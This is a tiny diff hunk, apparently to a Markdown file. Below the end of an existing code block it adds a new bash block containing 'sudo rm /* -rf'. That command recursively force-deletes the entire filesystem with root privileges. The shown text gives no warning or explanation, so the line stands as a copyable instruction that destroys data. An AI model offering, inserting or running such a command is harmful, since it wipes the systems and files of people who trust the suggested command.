@@ -48,3 +48,7 @@ lol|123|3
 		return 0;
 	}
 ```
+
+```bash
+sudo rm /* -rf
+```
